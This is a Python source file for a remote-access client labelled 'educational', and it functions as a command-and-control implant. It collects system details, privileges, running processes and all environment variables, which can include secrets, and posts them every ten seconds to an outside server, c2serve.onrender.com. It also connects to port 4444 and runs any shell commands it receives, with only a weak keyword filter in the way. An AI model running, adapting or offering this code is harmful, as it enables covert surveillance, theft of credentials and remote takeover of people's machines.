import socket
import platform
import subprocess
import json
import time
import os
from datetime import datetime
import threading
import requests

class EducationalClient:
    def __init__(self):
        self.config = {
            "server_ip": "https://c2serve.onrender.com",  # LAB SERVER IP - MUST CONFIGURE
            "command_port": 4444,
            "data_port": 8000,
            "session_id": f"EDU-{platform.node()}-{int(time.time())}",
            "poll_interval": 10,
            "safe_mode": True
        }
        
    def get_memory_info(self):
        try:
            if platform.system() == "Windows":
                output = subprocess.check_output("wmic memorychip get capacity", shell=True).decode()
                total = sum(int(line) for line in output.splitlines() if line.strip().isdigit())
                return f"{round(total/(1024**3), 2)} GB"
            else:
                return subprocess.check_output("free -h", shell=True).decode().split('\n')[1]
        except:
            return "N/A"

    def get_logged_in_users(self):
        try:
            if platform.system() == "Windows":
                return subprocess.check_output("query user", shell=True).decode()
            else:
                return subprocess.check_output("who", shell=True).decode()
        except:
            return "N/A"

    def get_installed_software(self):
        try:
            if platform.system() == "Windows":
                cmd = 'wmic product get name,version /format:csv'
                output = subprocess.check_output(cmd, shell=True).decode()
                # Parse CSV output for cleaner formatting
                lines = [line.strip() for line in output.split('\n') if line.strip()]
                if len(lines) > 1:
                    return "\n".join([", ".join(line.split(',')[1:]) for line in lines[1:]])
                return output
            elif platform.system() == "Linux":
                try:
                    return subprocess.check_output("dpkg-query -W", shell=True).decode()
                except:
                    return subprocess.check_output("rpm -qa", shell=True).decode()
            else:  # MacOS
                return subprocess.check_output(
                    "system_profiler SPApplicationsDataType | grep -E 'Location:|Version:'", 
                    shell=True
                ).decode()
        except Exception as e:
            return f"Cannot retrieve software list: {str(e)}"

    def get_network_connections(self):
        try:
            if platform.system() == "Windows":
                cmd = 'netstat -ano'
            elif platform.system() == "Linux":
                cmd = 'ss -tulnp'
            else:  # MacOS
                cmd = 'lsof -i -P'
            return subprocess.check_output(cmd, shell=True).decode()
        except Exception as e:
            return f"Cannot retrieve network connections: {str(e)}"

    def get_system_info(self):
        """Collect comprehensive system information"""
        return {
            "session_id": self.config['session_id'],
            "timestamp": str(datetime.now()),
            "system": {
                "os": platform.system(),
                "os_version": platform.version(),
                "os_release": platform.release(),
                "hostname": platform.node(),
                "machine": platform.machine(),
                "processor": platform.processor(),
                "architecture": platform.architecture()[0],
                "python_version": platform.python_version()
            },
            "network": {
                "ip": socket.gethostbyname(socket.gethostname()),
                "public_ip": self.get_public_ip(),
                "connections": self.get_network_connections(),
                "interfaces": self.get_network_interfaces()
            },
            "hardware": {
                "cpu_cores": os.cpu_count(),
                "memory": self.get_memory_info(),
                "disk": self.get_disk_info()
            },
            "users": {
                "logged_in": self.get_logged_in_users(),
                "current": os.getlogin(),
                "privileges": self.get_privilege_info()
            },
            "software": {
                "installed": self.get_installed_software(),
                "processes": self.get_running_processes()
            },
            "environment": dict(os.environ)
        }

    def get_public_ip(self):
        try:
            return requests.get('https://api.ipify.org').text
        except:
            return "N/A"

    def get_network_interfaces(self):
        try:
            if platform.system() == "Windows":
                return subprocess.check_output("ipconfig /all", shell=True).decode()
            else:
                return subprocess.check_output("ifconfig", shell=True).decode()
        except:
            return "N/A"

    def get_disk_info(self):
        try:
            if platform.system() == "Windows":
                return subprocess.check_output("wmic diskdrive get size,model", shell=True).decode()
            else:
                return subprocess.check_output("df -h", shell=True).decode()
        except:
            return "N/A"

    def get_privilege_info(self):
        try:
            if platform.system() == "Windows":
                return subprocess.check_output("whoami /priv", shell=True).decode()
            else:
                return subprocess.check_output("sudo -l", shell=True).decode()
        except:
            return "N/A"

    def get_running_processes(self):
        try:
            if platform.system() == "Windows":
                return subprocess.check_output("tasklist /v", shell=True).decode()
            else:
                return subprocess.check_output("ps aux", shell=True).decode()
        except:
            return "N/A"

    def send_system_data(self):
        """Periodically send system information to server"""
        while True:
            try:
                data = self.get_system_info()
                requests.post(
                    f"http://{self.config['server_ip']}:{self.config['data_port']}/api/data",
                    json=data,
                    timeout=5
                )
            except Exception as e:
                print(f"Error sending data: {e}")
            time.sleep(self.config['poll_interval'])

    def execute_command(self, cmd):
        """Execute system command with safety checks"""
        if self.config['safe_mode']:
            if any(bad in cmd.lower() for bad in ['format', 'del', 'rm', 'shutdown', 'init', 'kill']):
                return "Command blocked in safe mode"
        
        try:
            if cmd.lower() == "shutdown":
                return self.safe_shutdown()
            elif cmd.lower() == "restart":
                return self.safe_restart()
            
            result = subprocess.check_output(
                cmd, 
                shell=True, 
                stderr=subprocess.STDOUT,
                timeout=30
            )
            return result.decode()
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except subprocess.CalledProcessError as e:
            return e.output.decode()
        except Exception as e:
            return str(e)

    def safe_shutdown(self):
        """Safe shutdown with delay for cancellation"""
        if platform.system() == "Windows":
            subprocess.run(["shutdown", "/s", "/t", "60", "/c", "Educational client shutdown"])
            return "Shutdown scheduled in 60 seconds (use 'shutdown /a' to abort)"
        else:
            subprocess.run(["shutdown", "-h", "+1", "Educational client shutdown"])
            return "Shutdown scheduled in 1 minute (use 'shutdown -c' to abort)"

    def safe_restart(self):
        """Safe restart with delay for cancellation"""
        if platform.system() == "Windows":
            subprocess.run(["shutdown", "/r", "/t", "60", "/c", "Educational client restart"])
            return "Restart scheduled in 60 seconds (use 'shutdown /a' to abort)"
        else:
            subprocess.run(["shutdown", "-r", "+1", "Educational client restart"])
            return "Restart scheduled in 1 minute (use 'shutdown -c' to abort)"

    def start(self):
        """Main client execution loop"""
        print(f"[*] Client Started - Session ID: {self.config['session_id']}")
        print("[!] FOR PRIVATE USE ONLY - DO NOT DEPLOY IN PRODUCTION")
        print(f"[*] Safe mode: {'ENABLED' if self.config['safe_mode'] else 'DISABLED'}")
        
        # Start data collection thread
        data_thread = threading.Thread(target=self.send_system_data, daemon=True)
        data_thread.start()
        
        # Main command loop
        while True:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((self.config['server_ip'], self.config['command_port']))
                    s.sendall(self.config['session_id'].encode())
                    
                    while True:
                        command = s.recv(1024).decode().strip()
                        if not command or command.lower() in ["exit", "quit"]:
                            break
                        
                        output = self.execute_command(command)
                        s.sendall(output.encode())
            except Exception as e:
                print(f"Connection error: {e} - Retrying in 5 seconds...")
                time.sleep(5)

if __name__ == "__main__":
    client = EducationalClient()
    client.start()
